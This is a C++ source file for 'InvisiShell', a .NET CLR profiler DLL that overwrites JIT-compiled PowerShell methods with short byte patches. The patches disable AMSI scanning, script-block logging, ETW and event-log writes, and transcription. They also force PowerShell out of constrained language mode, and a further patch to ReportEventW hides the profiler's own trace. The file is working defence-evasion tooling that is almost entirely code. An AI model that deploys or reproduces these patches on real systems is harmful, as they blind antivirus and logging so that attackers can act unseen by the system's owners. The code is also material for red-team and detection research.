// Copyright (c) Javelin Networks. All rights reserved.
// This is a modified version of CorProfiler by .NET Foundation (with the same license):
// Copyright (c) .NET Foundation and contributors. All rights reserved.
// Licensed under the MIT license. See LICENSE file in the project root for full license information.

#include <corhlpr.h>
#include "CComPtr.h"
#include <string>
#include <Windows.h>

#include "InvisiShellProfiler.h"


#include "HookData.h"


InvisiShellProfiler::InvisiShellProfiler() : refCount(0), InvisiShellProfilerInfo(nullptr)
{

	this->bDetachInitiazted = false;

	this->g_InvisiShell[0] = { L"System.Management.Automation", L"System.Management.Automation.AmsiUtils", L"ScanContent", 2,
		"\x33\xC0\x0C\x01\xC3", 5, FALSE };
		// 33 c0		xor eax,eax
		// 0c 01		or al, 0x01
		// c3			ret

	this->g_InvisiShell[1] = { L"System.Management.Automation", L"System.Management.Automation.ScriptBlock", L"WriteScriptBlockToLog", 4,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[2] = { L"System.Management.Automation", L"System.Management.Automation.ScriptBlock", L"LogScriptBlockStart", 2,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[3] = { L"System.Management.Automation", L"System.Management.Automation.ScriptBlock", L"LogScriptBlockEnd", 2,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[4] = { L"System.Management.Automation", L"System.Management.Automation.EventLogLogProvider", L"LogEvent", 2,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[5] = { L"System.Management.Automation", L"System.Management.Automation.Tracing.PSEtwLogProvider", L"WriteEvent", 7,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[6] = { L"System.Management.Automation", L"System.Management.Automation.Host.TranscriptionOption", L"FlushContentToDisk", 0,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[7] = { L"System.Management.Automation", L"System.Management.Automation.ExecutionContext", L"get_LanguageMode", 0,
		"\x33\xC0\xC3", 3, FALSE };

	this->g_InvisiShell[8] = { L"System.Management.Automation", L"System.Management.Automation.ExecutionContext", L"get_HasEverUsedConstrainedLanguage", 0,
		"\x33\xC0\xC3", 3, FALSE };

	this->g_InvisiShell[9] = { L"System.Management.Automation", L"System.Management.Automation.ExecutionContext", L"get_HasRunspaceEverUsedConstrainedLanguageMode", 0,
		"\x33\xC0\xC3", 3, FALSE };

	this->g_InvisiShell[10] = { L"System.Management.Automation", L"System.Management.Automation.ExecutionContext", L"set_LanguageMode", 1,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[11] = { L"System.Core", L"System.Diagnostics.Eventing.EventProvider", L"WriteTransferEvent", 3,
		"\xC3", 1, FALSE };

	this->g_InvisiShell[12] = { L"System.Core", L"System.Diagnostics.Eventing.EventProvider", L"WriteTransferEvent", 4,
		"\xC3", 1, FALSE };

	// TODO : Think if this is needed
		//{ L"Microsoft.PowerShell.ConsoleHost.dll", L"Microsoft.PowerShell.ConsoleHost", L"WriteToTranscript", 1,
		//"\xC3", 1, FALSE },

		/// InvisiShell
		///////////////////////////////////////////////////////////
	
}

InvisiShellProfiler::~InvisiShellProfiler()
{
	if (this->InvisiShellProfilerInfo != nullptr)
    {
        this->InvisiShellProfilerInfo->Release();
        this->InvisiShellProfilerInfo = nullptr;
    }
}



void InvisiShellProfiler::RemoveProfilerTrace()
{
	HMODULE hAdvapi32 = NULL;
	PVOID pReportEventW = NULL;

	hAdvapi32 = GetModuleHandleW(L"advapi32.dll");
	if (NULL == hAdvapi32)
		goto Leave;

	pReportEventW = GetProcAddress(hAdvapi32, "ReportEventW");
	if (NULL == pReportEventW)
		goto Leave;
	
	if (FALSE == InvisiShellProfiler::PlaceHook(pReportEventW, "\x33\xC0\x0C\x01\xC3", 5))
		goto Leave;

Leave:
	return;
}



DWORD InvisiShellProfiler::DetachProfilerThread(ICorProfilerInfo3* InvisiShellProfilerInfo)
{
	DWORD hr = E_FAIL;
	MyDebugPrintA("Detach thread\n");

	HMODULE hMod = LoadLibraryA("InvisiShellProfiler.dll");

	if (NULL == hMod)
	{
		MyDebugPrintA("Failed getting handle to InvisiShellProfiler (error: %x)!\n", GetLastError());
		goto Leave;
	}

	if (NULL != InvisiShellProfilerInfo)
	{
		HRESULT hr = InvisiShellProfilerInfo->RequestProfilerDetach(1000);
		if (S_OK != hr)
		{
			
			MyDebugPrintA("Cannot detach profiler :( 0x%X\n", hr);
		}
	}

	FreeLibraryAndExitThread(hMod, 0);

	hr = S_OK;

Leave:
	return hr;
}

HRESULT InvisiShellProfiler::DetachProfiler()
{
	if (!bDetachInitiazted)
	{
		bDetachInitiazted = true;

		DWORD threadId = 0;
		if (FALSE == CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetachProfilerThread, (LPVOID)InvisiShellProfilerInfo, 0, &threadId))
		{
			MyDebugPrintA("Failed running detach thread!\n");
			return E_FAIL;
		}
		MyDebugPrintA("Success running detach thread!\n");

	}

	return S_OK;
}



// Finds the class in requested module and enumerates all methods until it finds the wanted function
UINT_PTR InvisiShellProfiler::GetJittedFunctionAddress(ModuleID moduleId, LPCWSTR szClassName, LPCWSTR szFuncName, ULONG nParamsCount)
{
	UINT_PTR retVal = 0;
	IUnknown *iUnknown = NULL;
	if (S_OK != this->InvisiShellProfilerInfo->GetModuleMetaData(moduleId, ofRead, IID_IMetaDataImport, &iUnknown))
	{
		MyDebugPrintA("GetModuleMetaData error\n");
		goto Leave;
	}
	MyDebugPrintA("Found MetaData\n");

	IMetaDataImport *metaData = (IMetaDataImport*)iUnknown;

	// Fetch the class TypeDef
	mdTypeDef mdScriptBlock = { 0 };
	ULONG nDefs = 0;
	if (S_OK == metaData->FindTypeDefByName(szClassName, NULL, &mdScriptBlock))
	{
		MyDebugPrintA("FindTypeDefByName\n");

		// Fetch the ClassID
		ClassID classID;
		if (S_OK != this->InvisiShellProfilerInfo->GetClassFromTokenAndTypeArgs(moduleId, mdScriptBlock, 0, NULL, &classID))
		{
			MyDebugPrintA("GetClassFromTokenAndTypeArgs failed\n");
			goto Leave;
		}

		// Enumerate all methods of class
		HCORENUM pMethodDefsEnum = NULL;
		mdMethodDef methodsDef;
		ULONG nMethodDefs = 1;
		HRESULT res = S_OK;
		do
		{
			res = metaData->EnumMethods(&pMethodDefsEnum, mdScriptBlock, &methodsDef, nMethodDefs, &nMethodDefs);
			if (nMethodDefs > 0)
			{
				// Fetch method's properties
				mdTypeDef           mdClass;
				WCHAR              szMethod[500];
				ULONG               cchMethod = 500;
				DWORD               dwAttr;
				PCCOR_SIGNATURE     pvSigBlob;
				ULONG               cbSigBlob = 0;
				ULONG               ulCodeRVA;
				DWORD               dwImplFlags;
				if (S_OK == metaData->GetMethodProps(methodsDef, &mdClass, szMethod, cchMethod, &cchMethod, &dwAttr, &pvSigBlob, &cbSigBlob, &ulCodeRVA, &dwImplFlags))
				{
					
					MyDebugPrintA("%S\n", szMethod);

					// Check if requested function was found
					if (0 == wcscmp(szMethod, szFuncName))
					{
						MyDebugPrintA("%S\n", szMethod);
						HCORENUM paramsEnum = NULL;
						mdParamDef mdParams[20] = { 0 };
						ULONG nParams = 20;
						// Fetch the params count to make sure we got the correct function
						// TODO: Add support for parameters type instead of just count
						HRESULT paramsRes = metaData->EnumParams(&paramsEnum, methodsDef, mdParams, nParams, &nParams);
						if (nParamsCount == nParams)
						{
							// Function Found! Get JITed code address
							FunctionID funcID;
							if (S_OK == this->InvisiShellProfilerInfo->GetFunctionFromTokenAndTypeArgs(moduleId, methodsDef, classID, 0, NULL, &funcID))
							{
								COR_PRF_CODE_INFO codeInfos[20] = { 0 };
								ULONG32 cCodeInfo = 20;
								if (S_OK == this->InvisiShellProfilerInfo->GetCodeInfo2(funcID, cCodeInfo, &cCodeInfo, codeInfos))
								{
									// GetCodeInfo2 returns an array of address sorted by the IL code so the first member is the beginning of the code
									retVal = codeInfos[0].startAddress;
									for (ULONG i = 0; i < cCodeInfo; ++i)
									{
										MyDebugPrintA("%d: %S at address %p (%p size)\n", i, szMethod, codeInfos[i].startAddress, codeInfos[i].size);
									}
								}
								else
								{
									MyDebugPrintA("GetCodeInfo2 failed\n");

								}

							}
						}

						metaData->CloseEnum(paramsEnum);
					}
					
				}
			}
		} while ((S_OK == res) && (0 == retVal));
		metaData->CloseEnum(pMethodDefsEnum);
	}
	else
	{
		MyDebugPrintA("FindTypeDefByName error\n");
	}

Leave:
	return retVal;
}

bool InvisiShellProfiler::PlaceHook(void* lpFunction, void* pHookBuffer, size_t nHookBufferSize)
{
	bool retVal = false;
	// No need to actually place hook, we can just overwrite the bytes with RET opcode
	DWORD dwOldProtection = 0;
	// Get write permissions on the memory area
	if (FALSE == VirtualProtect((LPVOID)lpFunction, nHookBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection))
	{
		MyDebugPrintA("Failed modifying hooked function memory protection at %p, size %x\n", lpFunction, (DWORD)nHookBufferSize);
		goto Leave;
	}
	memcpy((void*)lpFunction, pHookBuffer, nHookBufferSize);
	// Hook is in place, further code is courtesy cleanup
	// If memory protection was modified, restore it to original state
	if (PAGE_EXECUTE_READWRITE != dwOldProtection &&
		(FALSE == VirtualProtect((LPVOID)lpFunction, nHookBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
	{
		MyDebugPrintA("Failed restorig previous memory protection\n");
	}

	retVal = true;
Leave:
	return retVal;

}




bool InvisiShellProfiler::FindAndPlaceHooks(
	ModuleID modId,
	LPCWCHAR szClass,
	LPCWCHAR szFunction,
	ULONG nParams,
	LPVOID pHookBuffer,
	BYTE nHookBufferSize
	)
{
	MyDebugPrintA("%S.%S (original)\n", szClass, szFunction);

	bool bRetVal = false;
	UINT_PTR lpFunction = GetJittedFunctionAddress(modId, szClass, szFunction, nParams);
	if (NULL == lpFunction)
		goto Leave;
	MyDebugPrintA("%S.%S (original) found\n", szClass, szFunction);

	bRetVal = PlaceHook((void*)lpFunction, pHookBuffer, nHookBufferSize);

Leave:
	if (bRetVal)
	{
		MyDebugPrintA("Success placing hooks on %S.%S\n", szClass, szFunction);
	}
	else
	{
		MyDebugPrintA("Failed placing hooks on %S.%S\n", szClass, szFunction);
	}
	return bRetVal;
}

bool InvisiShellProfiler::InstallHooks(HookData pHookData[], DWORD nHookCount, ModuleID miHookedModule, WCHAR *szAssemblyName)
{
	DWORD nHookedFunctions = 0;
	for (DWORD i = 0; i < nHookCount; ++i)
	{
		if (pHookData[i].bHooked)
		{
			++nHookedFunctions;
			continue;
		}

		if (0 != wcscmp(szAssemblyName, pHookData[i].szHookedModuleName))
		{
			continue;
		}

		MyDebugPrintA("Trying to hook:\n[+] %S(%d)::%S.%S(%d args)\n",
			pHookData[i].szHookedModuleName,
			miHookedModule,
			pHookData[i].szHookedClass,
			pHookData[i].szHookedFunction,
			pHookData[i].nHookedFunctionArgumentsCount);

		if (FindAndPlaceHooks(
			miHookedModule,
			pHookData[i].szHookedClass,
			pHookData[i].szHookedFunction,
			pHookData[i].nHookedFunctionArgumentsCount,
			pHookData[i].lpHookBuffer,
			pHookData[i].nHookBufferSize))
		{
			pHookData[i].bHooked = TRUE;
			++nHookedFunctions;
		}

	}

	if (nHookedFunctions == nHookCount)
	{
		MyDebugPrintA("All hooks in place, calling DetachProfiler\n");
		this->DetachProfiler();
	}
	return true;
}


HRESULT STDMETHODCALLTYPE InvisiShellProfiler::Initialize(IUnknown *pICorProfilerInfoUnk)
{
	MyDebugPrintA("In InvisiShellProfiler::Initialize\n");

	//HRESULT queryInterfaceResult = pICorProfilerInfoUnk->QueryInterface(__uuidof(ICorProfilerInfo2), reinterpret_cast<void **>(&this->InvisiShellProfilerInfo));
	HRESULT queryInterfaceResult = pICorProfilerInfoUnk->QueryInterface(__uuidof(ICorProfilerInfo3), reinterpret_cast<void **>(&this->InvisiShellProfilerInfo));

	if (FAILED(queryInterfaceResult))
	{
		return E_FAIL;
	}

	DWORD eventMask = COR_PRF_MONITOR_ASSEMBLY_LOADS;


	HRESULT hr = this->InvisiShellProfilerInfo->SetEventMask(eventMask);

	this->RemoveProfilerTrace();

	return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::Shutdown()
{
    if (this->InvisiShellProfilerInfo != nullptr)
    {
        this->InvisiShellProfilerInfo->Release();
        this->InvisiShellProfilerInfo = nullptr;
    }

    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AppDomainCreationStarted(AppDomainID appDomainId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AppDomainCreationFinished(AppDomainID appDomainId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AppDomainShutdownStarted(AppDomainID appDomainId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AppDomainShutdownFinished(AppDomainID appDomainId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AssemblyLoadStarted(AssemblyID assemblyId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AssemblyLoadFinished(AssemblyID assemblyId, HRESULT hrStatus)
{
	MyDebugPrintA("AssemblyLoadFinished, AssemblyID: %X\n", assemblyId);
	WCHAR szName[MAX_PATH];
	ULONG cchName = MAX_PATH;
	AppDomainID adAppDomainId;
	ModuleID mdModuleId;


	HRESULT hr = this->InvisiShellProfilerInfo->GetAssemblyInfo(
		assemblyId,
		cchName,
		&cchName,
		szName,
		&adAppDomainId,
		&mdModuleId);
	if (S_OK != hr || cchName > MAX_PATH)
	{
		MyDebugPrintA("Failed getting assembly name, AssemblyID: %x, HRESULT: %X, Length: %x\n", assemblyId, hr, cchName);
		goto Leave;
	}
	MyDebugPrintA("Found assembly %S\n", szName);

	InstallHooks(g_InvisiShell, sizeof(g_InvisiShell) / sizeof(HookData), mdModuleId, szName);

Leave:
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AssemblyUnloadStarted(AssemblyID assemblyId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::AssemblyUnloadFinished(AssemblyID assemblyId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ModuleLoadStarted(ModuleID moduleId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ModuleLoadFinished(ModuleID moduleId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ModuleUnloadStarted(ModuleID moduleId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ModuleUnloadFinished(ModuleID moduleId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ModuleAttachedToAssembly(ModuleID moduleId, AssemblyID AssemblyId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ClassLoadStarted(ClassID classId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ClassLoadFinished(ClassID classId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ClassUnloadStarted(ClassID classId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ClassUnloadFinished(ClassID classId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::FunctionUnloadStarted(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::JITCompilationStarted(FunctionID functionId, BOOL fIsSafeToBlock)
{
	return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::JITCompilationFinished(FunctionID functionId, HRESULT hrStatus, BOOL fIsSafeToBlock)
{

    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::JITCachedFunctionSearchStarted(FunctionID functionId, BOOL *pbUseCachedFunction)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::JITCachedFunctionSearchFinished(FunctionID functionId, COR_PRF_JIT_CACHE result)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::JITFunctionPitched(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::JITInlining(FunctionID callerId, FunctionID calleeId, BOOL *pfShouldInline)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ThreadCreated(ThreadID threadId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ThreadDestroyed(ThreadID threadId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ThreadAssignedToOSThread(ThreadID managedThreadId, DWORD osThreadId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingClientInvocationStarted()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingClientSendingMessage(GUID *pCookie, BOOL fIsAsync)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingClientReceivingReply(GUID *pCookie, BOOL fIsAsync)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingClientInvocationFinished()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingServerReceivingMessage(GUID *pCookie, BOOL fIsAsync)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingServerInvocationStarted()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingServerInvocationReturned()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RemotingServerSendingReply(GUID *pCookie, BOOL fIsAsync)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::UnmanagedToManagedTransition(FunctionID functionId, COR_PRF_TRANSITION_REASON reason)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ManagedToUnmanagedTransition(FunctionID functionId, COR_PRF_TRANSITION_REASON reason)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeSuspendStarted(COR_PRF_SUSPEND_REASON suspendReason)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeSuspendFinished()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeSuspendAborted()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeResumeStarted()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeResumeFinished()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeThreadSuspended(ThreadID threadId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RuntimeThreadResumed(ThreadID threadId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::MovedReferences(ULONG cMovedObjectIDRanges, ObjectID oldObjectIDRangeStart[], ObjectID newObjectIDRangeStart[], ULONG cObjectIDRangeLength[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ObjectAllocated(ObjectID objectId, ClassID classId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ObjectsAllocatedByClass(ULONG cClassCount, ClassID classIds[], ULONG cObjects[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ObjectReferences(ObjectID objectId, ClassID classId, ULONG cObjectRefs, ObjectID objectRefIds[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RootReferences(ULONG cRootRefs, ObjectID rootRefIds[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionThrown(ObjectID thrownObjectId)
{

    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionSearchFunctionEnter(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionSearchFunctionLeave()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionSearchFilterEnter(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionSearchFilterLeave()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionSearchCatcherFound(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionOSHandlerEnter(UINT_PTR __unused)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionOSHandlerLeave(UINT_PTR __unused)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionUnwindFunctionEnter(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionUnwindFunctionLeave()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionUnwindFinallyEnter(FunctionID functionId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionUnwindFinallyLeave()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionCatcherEnter(FunctionID functionId, ObjectID objectId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionCatcherLeave()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::COMClassicVTableCreated(ClassID wrappedClassId, REFGUID implementedIID, void *pVTable, ULONG cSlots)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::COMClassicVTableDestroyed(ClassID wrappedClassId, REFGUID implementedIID, void *pVTable)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionCLRCatcherFound()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ExceptionCLRCatcherExecute()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ThreadNameChanged(ThreadID threadId, ULONG cchName, WCHAR name[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::GarbageCollectionStarted(int cGenerations, BOOL generationCollected[], COR_PRF_GC_REASON reason)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::SurvivingReferences(ULONG cSurvivingObjectIDRanges, ObjectID objectIDRangeStart[], ULONG cObjectIDRangeLength[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::GarbageCollectionFinished()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::FinalizeableObjectQueued(DWORD finalizerFlags, ObjectID objectID)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::RootReferences2(ULONG cRootRefs, ObjectID rootRefIds[], COR_PRF_GC_ROOT_KIND rootKinds[], COR_PRF_GC_ROOT_FLAGS rootFlags[], UINT_PTR rootIds[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::HandleCreated(GCHandleID handleId, ObjectID initialObjectId)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::HandleDestroyed(GCHandleID handleId)
{
	return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::InitializeForAttach(IUnknown *pInvisiShellProfilerInfoUnk, void *pvClientData, UINT cbClientData)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ProfilerAttachComplete()
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ProfilerDetachSucceeded()
{
    return S_OK;
}


HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ReJITCompilationStarted(FunctionID functionId, ReJITID rejitId, BOOL fIsSafeToBlock)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::GetReJITParameters(ModuleID moduleId, mdMethodDef methodId, ICorProfilerFunctionControl *pFunctionControl)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ReJITCompilationFinished(FunctionID functionId, ReJITID rejitId, HRESULT hrStatus, BOOL fIsSafeToBlock)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ReJITError(ModuleID moduleId, mdMethodDef methodId, FunctionID functionId, HRESULT hrStatus)
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::MovedReferences2(ULONG cMovedObjectIDRanges, ObjectID oldObjectIDRangeStart[], ObjectID newObjectIDRangeStart[], SIZE_T cObjectIDRangeLength[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::SurvivingReferences2(ULONG cSurvivingObjectIDRanges, ObjectID objectIDRangeStart[], SIZE_T cObjectIDRangeLength[])
{
    return S_OK;
}

HRESULT STDMETHODCALLTYPE InvisiShellProfiler::ConditionalWeakTableElementReferences(ULONG cRootRefs, ObjectID keyRefIds[], ObjectID valueRefIds[], GCHandleID rootIds[])
{
    return S_OK;
}

